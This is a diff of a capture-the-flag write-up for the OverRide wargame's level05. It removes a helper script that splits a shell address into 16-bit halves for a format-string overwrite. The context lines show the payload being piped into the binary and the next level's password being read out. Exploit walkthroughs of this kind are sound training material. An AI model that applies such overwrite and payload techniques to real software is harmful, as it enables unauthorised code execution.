@@ -184,7 +184,7 @@ level05@OverRide:~$ (cat /tmp/pyload; cat) | ./level05 > /dev/null
 
 more organized syntax
 
-```
+```py
 import struct
 
 shell_addr = 0xffffdea0
@@ -208,52 +208,3 @@ pwd 1>&2
 cat /home/users/level06/.pass 1>&2
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
-
-```
-shell = 0xabcdef90
-
-addr = 0x12345678
-new_msb = shell & 0xffff
-new_lsb = shell >> 16
-
-print("shell = " + hex(shell))
-print("addr  = " + hex(addr))
-
-print("---------------\n")
-
-masked_addr = addr & 0xffff
-new_addr = masked_addr | (new_lsb << 16)
-
-print("masked = " + hex(masked_addr))
-print("new    = " + hex(new_addr))
-
-print("----------------\n")
-
-masked_addr = new_addr & 0xFFFF0000
-new_addr = masked_addr | new_msb
-
-print("masked = " + hex(masked_addr))
-print("new    = " + hex(new_addr))
-
-
-
-
-level05@OverRide:~$ python /tmp/pay.py
-shell = 0xabcdef90
-addr  = 0x12345678
----------------
-
-masked = 0x5678
-new    = 0xef905678
-----------------
-
-masked = 0xef900000
-new    = 0xef90ef90
-
-```
-
-
-
-
-
-
